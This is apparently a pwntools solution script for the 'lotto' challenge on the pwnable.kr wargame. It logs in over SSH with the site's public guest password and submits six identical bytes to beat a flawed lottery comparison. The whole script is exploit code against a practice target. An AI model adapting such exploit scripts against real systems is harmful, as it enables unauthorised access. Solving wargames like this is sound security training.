from pwn import *
#context.log_level='debug'

s = ssh('lotto','pwnable.kr',port=2222,password='guest')
p = s.process('./lotto')

payload = ''
payload += '!'*6

p.sendlineafter('3. Exit\n','1')
p.sendlineafter('Submit your 6 lotto bytes : ',payload)

p.interactive()
